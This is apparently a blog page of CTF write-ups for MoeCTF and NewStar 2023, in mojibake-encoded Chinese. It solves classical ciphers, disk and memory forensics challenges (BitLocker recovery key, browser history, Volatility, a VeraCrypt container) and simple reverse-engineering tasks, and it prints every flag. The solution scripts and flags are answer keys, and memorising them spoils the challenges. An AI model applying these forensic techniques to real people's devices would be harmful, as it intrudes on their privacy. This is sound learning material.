<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=777">http://www.atoolbox.net/Tool.php?Id=777</a> åœ¨çº¿è§£å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;F3nc3_ciph3r_shiFTs_3ach_l3TT3r_By_a_Giv3n_nuMB3r_oF_plac3s_Ojpj&#125;</span><br></pre></td></tr></table></figure>



<h2 id="çš‡å¸çš„æ–°å¯†ç "><a href="#çš‡å¸çš„æ–°å¯†ç " class="headerlink" title="çš‡å¸çš„æ–°å¯†ç "></a>çš‡å¸çš„æ–°å¯†ç </h2><p>è§‚å¯Ÿé•¿åº¦ï¼Œå­—ç¬¦ç»“æ„ï¼Œåƒæ˜¯å°†æ¯ä¸ªå­—ç¬¦çš„asciiåç§»nä½ï¼Œæœç´¢åˆ°äº†å‡¯æ’’å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tvljam&#123;JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.lddgo.net/encrypt/caesar-cipher">https://www.lddgo.net/encrypt/caesar-cipher</a> åç§»7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ä¸æ˜¯â€œçš‡å¸çš„æ–°å¯†ç â€"><a href="#ä¸æ˜¯â€œçš‡å¸çš„æ–°å¯†ç â€" class="headerlink" title="ä¸æ˜¯â€œçš‡å¸çš„æ–°å¯†ç â€"></a>ä¸æ˜¯â€œçš‡å¸çš„æ–°å¯†ç â€</h2><p>è¿™ä¸ªé¢˜å¥½å‘å•Šï¼Œè¿™é‡Œè¿™ä¸ªmd5æ˜¯keyçš„md5ï¼Œä¸æ˜¯flagçš„md5ï¼Œä½†æ˜¯ä¸Šé¢å†™ç€md5 of flagï¼Œæˆ‘è§£äº†åŠå¤©å‡ºä¸æ¥ï¼Œæƒ³æ¥æƒ³å»ä¹Ÿä¸æ˜¯ä»£ç é€»è¾‘æœ‰é—®é¢˜ï¼Œå¼„äº†å‡ ç»„æ•°æ®è¿›å»ï¼Œè„šæœ¬éƒ½æ²¡æœ‰é—®é¢˜ã€‚</p>
<p>å¯†æ–‡çœ‹èµ·æ¥åƒæ˜¯æ¯ä½éƒ½åç§»äº†nä½ï¼Œæ˜æ–‡å‰å…­ä½æ˜¯moectfï¼Œç„¶åè·‘äº†ä¸€ä¸‹è„šæœ¬å‘ç°æ¯ä½åç§»éƒ½ä¸å¤ªä¸€æ ·ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆè§„å¾‹ã€‚åé¢å‘ç°æ˜¯ç»´å‰å°¼äºšå¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scsfct&#123;wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn&#125;</span><br><span class="line"></span><br><span class="line">md5 of flag (utf-8) `ea23f80270bdd96b5fcd213cae68eea5`</span><br></pre></td></tr></table></figure>

<p>ç½‘ä¸ŠæŸ¥è¯¢åˆ°ï¼Œç»´å‰å°¼äºšå¯†ç é¦–å…ˆè¦ç¡®å®škeyçš„é•¿åº¦ï¼Œç®—å‡ºæ¥æ˜¯7ï¼Œç„¶åå‰å…­ä½moectfç®—å‡ºå‰å…­ä½keyï¼Œçˆ†ç ´ç¬¬ä¸ƒä½å’Œmd5æ¯”è¾ƒæ‹¿åˆ°keyè§£å¯†flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">virginiaCrack</span>(<span class="params">cipherText,key</span>): <span class="comment"># è§£å¯†å‡½æ•°</span></span><br><span class="line">    length = getKeyLen(cipherText) <span class="comment">#å¾—åˆ°å¯†é’¥é•¿åº¦</span></span><br><span class="line">    <span class="comment"># key = getKey(cipherText,length) #æ‰¾åˆ°å¯†é’¥</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">        key = <span class="string">&quot;moectf&quot;</span> + i</span><br><span class="line">        keyStr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">            keyStr+=k</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;the key:&#x27;</span>,keyStr)</span><br><span class="line">        plainText = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> cipherText:</span><br><span class="line">                c = <span class="built_in">chr</span>((<span class="built_in">ord</span>(ch)-<span class="built_in">ord</span>(key[index%length]))%<span class="number">26</span>+<span class="number">97</span>)</span><br><span class="line">                plainText += c</span><br><span class="line">                index+=<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(plainText)</span><br><span class="line">        <span class="keyword">return</span> plainText</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®æ˜æ–‡å’Œå¯†æ–‡åç§»å…³ç³»æ±‚å‰é¢çš„key</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_key</span>(<span class="params">plaintext, ciphertext</span>):</span><br><span class="line">    alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> p, c <span class="keyword">in</span> <span class="built_in">zip</span>(plaintext, ciphertext):</span><br><span class="line">        p_idx = alphabet.index(p)</span><br><span class="line">        c_idx = alphabet.index(c)</span><br><span class="line"></span><br><span class="line">        k_idx = (c_idx - p_idx) % <span class="number">26</span></span><br><span class="line">        key += alphabet[k_idx]</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="comment">#è§£å¯†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_decrypt_extended</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    key = key.lower()</span><br><span class="line">    key_expanded = (key * (<span class="built_in">len</span>(ciphertext) // <span class="built_in">len</span>(key) + <span class="number">1</span>))[:<span class="built_in">len</span>(ciphertext)]</span><br><span class="line">    key_index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">            k = key_expanded[key_index]</span><br><span class="line">            c_idx = alphabet.index(c)</span><br><span class="line">            k_idx = alphabet.index(k)</span><br><span class="line"></span><br><span class="line">            p_idx = (c_idx - k_idx) % <span class="number">26</span></span><br><span class="line">            plaintext += alphabet[p_idx]</span><br><span class="line"></span><br><span class="line">            key_index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext += c</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(text.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">plaintext_prefix = <span class="string">&quot;moectf&quot;</span></span><br><span class="line">ciphertext_prefix = <span class="string">&quot;scsfct&quot;</span></span><br><span class="line">md5_target = <span class="string">&quot;ea23f80270bdd96b5fcd213cae68eea5&quot;</span></span><br><span class="line">ciphertext = <span class="string">&quot;scsfct&#123;wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å‰å…­ä½key</span></span><br><span class="line">key_prefix = vigenere_key(plaintext_prefix, ciphertext_prefix)</span><br><span class="line"></span><br><span class="line"><span class="comment">#çˆ†ç ´ç¬¬ä¸ƒä½key</span></span><br><span class="line">key_candidates = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"><span class="keyword">for</span> candidate <span class="keyword">in</span> key_candidates:</span><br><span class="line">    test_key = key_prefix + candidate</span><br><span class="line">    decrypted_text = vigenere_decrypt_extended(ciphertext_prefix, test_key)</span><br><span class="line">    <span class="keyword">if</span> md5_hash(decrypted_text) == md5_target:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è§£å¯†</span></span><br><span class="line">ciphertext_lower = ciphertext.lower()</span><br><span class="line">decrypted_text_full = vigenere_decrypt_extended(ciphertext_lower, test_key)</span><br><span class="line">decrypted_text_restored = <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">    [decrypted_text_full[i] <span class="keyword">if</span> c.islower() <span class="keyword">else</span> decrypted_text_full[i].upper() <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphertext)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_text_restored)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;vIgENErE_CIphEr_Is_a_lIttlE_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz&#125;</span><br></pre></td></tr></table></figure>





<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h1 id="ai"><a href="#ai" class="headerlink" title="ai"></a>ai</h1><h2 id="AIå…¥é—¨æŒ‡åŒ—"><a href="#AIå…¥é—¨æŒ‡åŒ—" class="headerlink" title="AIå…¥é—¨æŒ‡åŒ—"></a>AIå…¥é—¨æŒ‡åŒ—</h2><p>åœ¨è¿™æ‰¾åˆ°ä¸å¸¦gpuç‰ˆæœ¬çš„å®‰è£…å‘½ä»¤ <a target="_blank" rel="noopener" href="https://pytorch.org/">https://pytorch.org/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;install_torch_torchvision_torchaudio&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="éšèº«æºå¸¦çš„è™šæ‹Ÿæœº"><a href="#éšèº«æºå¸¦çš„è™šæ‹Ÿæœº" class="headerlink" title="éšèº«æºå¸¦çš„è™šæ‹Ÿæœº"></a>éšèº«æºå¸¦çš„è™šæ‹Ÿæœº</h2><p>æ ¡å›­ç½‘å¥½å¡ï¼Œé™„ä»¶ä¸‹è½½äº†åŠå¤©ï¼Œè§£å‹åå‘ç°å…¨æ˜¯vmdkçš„æ–‡ä»¶</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jcjic/article/details/118241188">https://blog.csdn.net/jcjic/article/details/118241188</a> æ ¹æ®è¿™ç¯‡æ–‡ç« åˆ›å»ºäº†ä¸€ä¸ªwin10è™šæ‹Ÿæœºç„¶åå¯¼å…¥vmdkè¿›å…¥äº†ç³»ç»Ÿ</p>
<p>å‘ç°æœ‰ä¸€ä¸ªç£ç›˜è¢«bitlooké”ä½äº†ï¼Œç„¶ååœ¨å›æ”¶ç«™è¿™å‘ç°äº†è¿™ä¸ªæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">BitLocker Drive Encryption recovery key </span><br><span class="line"></span><br><span class="line">To verify that this is the correct recovery key, compare the start of the following identifier with the identifier value displayed on your PC.</span><br><span class="line"></span><br><span class="line">Identifier:</span><br><span class="line"></span><br><span class="line">	4DFEE901-55AC-43EB-96F4-FFE09609952A</span><br><span class="line"></span><br><span class="line">If the above identifier matches the one displayed by your PC, then use the following key to unlock your drive.</span><br><span class="line"></span><br><span class="line">Recovery Key:</span><br><span class="line"></span><br><span class="line">	702801-061622-323125-555819-258544-713713-089331-406373</span><br><span class="line"></span><br><span class="line">If the above identifier doesn&#x27;t match the one displayed by your PC, then this isn&#x27;t the right key to unlock your drive.</span><br><span class="line">Try another recovery key, or refer to https://go.microsoft.com/fwlink/?LinkID=260589 for additional assistance.</span><br></pre></td></tr></table></figure>

<p>è§£é”ç£ç›˜åå‘ç°flag.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bW9lY3Rme0JhczFjX0QxNWtfRjByM25zMWNzIX0=</span><br></pre></td></tr></table></figure>

<p>base64è§£ç è·å¾—flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Bas1c_D15k_F0r3ns1cs!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="åšæŒè®¿é—®çš„æµè§ˆå™¨"><a href="#åšæŒè®¿é—®çš„æµè§ˆå™¨" class="headerlink" title="åšæŒè®¿é—®çš„æµè§ˆå™¨"></a>åšæŒè®¿é—®çš„æµè§ˆå™¨</h2><p>æŸ¥è¯¢èµ„æ–™åå‘ç°åœ¨ ~&#x2F;.mozilla&#x2F;firefox&#x2F;â€¦â€¦.. ä¸‹æœ‰ä¸ªplaces.sqliteå­˜å‚¨æµè§ˆå™¨çš„å†å²è®°å½•å’Œæ ‡ç­¾ã€‚</p>
<p>ç„¶å moz_placesè¡¨ä¸­å­˜å‚¨ç½‘ç«™url æ ‡é¢˜ç­‰ç›¸å…³ä¿¡æ¯</p>
<p>åœ¨è¿™ä¸ªè¡¨ä¸­å‘ç°äº†<a target="_blank" rel="noopener" href="https://hymint.space/~koito/">https://hymint.space/~koito/</a> è¿™ä¸ªç½‘ç«™ï¼Œå°è¯•è®¿é—®ä¸€ä¸‹å‘ç°æ‰“å¼€äº†ï¼Œæ²¡ä»€ä¹ˆåŠŸèƒ½</p>
<p>f12æ‰¾åˆ°äº†flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">  I am always thinking about creating a flag that is safe enough.</span><br><span class="line">  I came up with lots of ideas and moectf&#123;Th15_iS_d3f1ni7e1y_1Ast_0NE_30a13cfb8426e919ecd4c5627cde4fa4&#125;</span><br><span class="line">  Next step is to hide it into this page!</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Th15_iS_d3f1ni7e1y_1Ast_0NE_30a13cfb8426e919ecd4c5627cde4fa4&#125;</span><br></pre></td></tr></table></figure>



<h2 id="é”å®šèµ·æ¥çš„åŒäººæ–‡"><a href="#é”å®šèµ·æ¥çš„åŒäººæ–‡" class="headerlink" title="é”å®šèµ·æ¥çš„åŒäººæ–‡"></a>é”å®šèµ·æ¥çš„åŒäººæ–‡</h2><p>ä¸€å¼€å§‹ä¸å¤ªæ‡‚dumpmem.rawå’Œqaq.hc æ˜¯ä»€ä¹ˆæ–‡ä»¶ï¼Œæœç´¢äº†ä¸€ä¸‹åå‘ç°ä¸€ä¸ªæ˜¯å†…å­˜é•œåƒï¼Œä¸€ä¸ªæ˜¯ç”¨VeraCryptåŠ å¯†çš„æ–‡ä»¶ã€‚ç„¶åæ‰¾åˆ°äº†è¿™ä¸ªå†…å­˜è½¯ä»¶</p>
<p><a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility3/">https://github.com/volatilityfoundation/volatility3/</a> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f dumpmem.raw --profile Win2016x64_14393 filescan | findstr /R &quot;txt png jpg gif zip rar 7z pdf doc&quot;</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°ä¸€ä¸ªkey 0x958246a8c550	\Users\Administrator\Desktop\key_pixiv_id105614615.png	ï¼Œä½†æ˜¯dumpfileä¸ä¸‹æ¥ï¼Œç¿»äº†å¾ˆå¤šissueè¿˜æœ‰è¯•è¿‡æ¢3,ä¹Ÿæ˜¯dumpä¸ä¸‹æ¥</p>
<p>ä¸€å¼€å§‹è€ƒè™‘åˆ°å›¾ç‰‡ä¸‹è½½ç½‘ç«™ç•¥ç¼©å›¾çš„åŸå› ï¼Œå¯èƒ½æˆ‘æ ¹æ®idæœä¸‹è½½ä¸‹æ¥çš„keyä¸æ­£ç¡®ï¼Œæœ€ådumpfileæ²¡æœ‰æ€è·¯çš„æ—¶å€™ï¼Œè¯•äº†ä¸€ä¸‹æœç´¢ä¸‹è½½å½“keyï¼Œç„¶åè§£å‡ºæ¥äº†</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv3744376/">https://www.bilibili.com/read/cv3744376/</a> pç«™æœidçš„æ–¹æ³•</p>
<p><a target="_blank" rel="noopener" href="http://www.pixiv.net/member.php?id=105614615">http://www.pixiv.net/member.php?id=105614615</a> æœåˆ°äº†å›¾ç‰‡ è§£å¯†äº†.hcæ–‡ä»¶</p>
<p>tmpç›®å½•ä¸‹å‘ç° history.db siyuan.dbè¿˜æœ‰pandocï¼Œæœäº†ä¸€ä¸‹pandocæ˜¯ä¸€ä¸ªæ–‡æ¡£è½¬æ¢çš„ç¨‹åºï¼Œsiyuanæ˜¯ä¸€ä¸ªæ’ä»¶ï¼Œåœ¨siyuan.dbä¸­çš„ block_fts_contentä¸­å‘ç°äº†.syçš„æ–‡ä»¶åè¿˜æœ‰å†…å®¹</p>
<p>NVXWKY3UMZ5VGMC7MQZTG4DMPFPUQMLEMRSW4IL5 è¿™åƒæ˜¯æŸç§ç¼–ç ï¼Œæ ¹æ®æœç´¢ç¼–ç ç‰¹å¾åï¼Œå‘ç°æ˜¯base32</p>
<p><a target="_blank" rel="noopener" href="https://www.lzltool.cn/Tools/Base32Decode">https://www.lzltool.cn/Tools/Base32Decode</a></p>
<p>è§£å¯†åå¾—åˆ°flag </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;S0_d33ply_H1dden!&#125;</span><br></pre></td></tr></table></figure>



<p>wwï¼Œmoectfå­¦åˆ°æŒºå¤šä¸œè¥¿çš„æï¼Œå…¥é—¨äº†reå’Œpwnï¼Œåé¢æ¯”è¾ƒå¿™å°±æ²¡æœ‰ç»§ç»­åšäº†qaq</p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-28</span><span class="leancloud_visitors"></span><span>About 13815 words, 46 min 3 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/28/newstar2023-week1/">newstar2023_week1</a></h3></div><div class="post-content"><div class="card"><p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="easy-RE"><a href="#easy-RE" class="headerlink" title="easy_RE"></a>easy_RE</h2><p>ç¡®å®æ˜¯æ‰“å¼€å°±æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;we1c0me_to_rev3rse!!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="elf"><a href="#elf" class="headerlink" title="elf"></a>elf</h2><p>inputString å…ˆå¼‚æˆ–ç„¶å+16 ç„¶åbase64encodeåå’Œflag cmpï¼Œdecodeå-16 å¼‚æˆ–å°±å¥½äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s1 = (char *)base64_encode(v6, v3);</span><br><span class="line">  if ( !strcmp(s1, &quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;) )</span><br><span class="line">  </span><br><span class="line"> ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall encode(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // rax</span><br><span class="line">  int v2; // eax</span><br><span class="line">  _BYTE *v4; // [rsp+20h] [rbp-20h]</span><br><span class="line">  int i; // [rsp+28h] [rbp-18h]</span><br><span class="line">  int v6; // [rsp+2Ch] [rbp-14h]</span><br><span class="line"></span><br><span class="line">  v1 = strlen(a1);</span><br><span class="line">  v4 = malloc(2 * v1 + 1);</span><br><span class="line">  v6 = 0;</span><br><span class="line">  for ( i = 0; i &lt; strlen(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v6++;</span><br><span class="line">    v4[v2] = (a1[i] ^ 0x20) + 16;</span><br><span class="line">  &#125;</span><br><span class="line">  v4[v6] = 0;</span><br><span class="line">  return v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_base64_decode</span>(<span class="params">encoded_str</span>):</span><br><span class="line">    custom_base64_chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    standard_base64_chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    translation = <span class="built_in">str</span>.maketrans(custom_base64_chars, standard_base64_chars)</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(encoded_str.translate(translation))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">encoded_bytes</span>):</span><br><span class="line">    decoded_chars = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> encoded_bytes:</span><br><span class="line">        char = <span class="built_in">chr</span>((byte - <span class="number">16</span>) ^ <span class="number">0x20</span>)</span><br><span class="line">        decoded_chars.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decoded_chars)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encoded_str = <span class="string">&quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;</span></span><br><span class="line"><span class="built_in">print</span>(xor(custom_base64_decode(encoded_str)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;D0_4ou_7now_wha7_ELF_1s?&#125;</span><br></pre></td></tr></table></figure>



<h2 id="å’³"><a href="#å’³" class="headerlink" title="å’³"></a>å’³</h2><p>dieæŸ¥å£³æ˜¯upx4.0.2 , åœ¨è¿™é‡Œä¸‹è½½<a target="_blank" rel="noopener" href="https://github.com/upx/upx/releases">https://github.com/upx/upx/releases</a> </p>
<p>ç„¶åupx -d filename è„±å£³</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>i64; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = &amp;Str1[<span class="built_in">strlen</span>(Str1)];</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= v4 - Str1 )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  ++Str1[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, enc, v4 - Str1) )</span><br></pre></td></tr></table></figure>

<p>gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~</p>
<p>å¤§æ¦‚æ˜¯å§str1å…¨éƒ¨++äº†ä¸€è¾¹ â€“å›å»å°±å¥½äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = &quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&quot;</span><br><span class="line">flag = [c for c in flag]</span><br><span class="line">for i in range(len(flag)):</span><br><span class="line">    flag[i] = chr(ord(flag[i]) - 1)</span><br><span class="line">    print(flag[i] , end=&quot;&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Segments"><a href="#Segments" class="headerlink" title="Segments"></a>Segments</h2><p>shift_f7 æ‰“å¼€æ®µè§†å›¾ï¼Œç„¶åæ‹¼æ¥flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;You_ar3_g0od_at_f1nding_ELF_segments_name&#125;</span><br></pre></td></tr></table></figure>



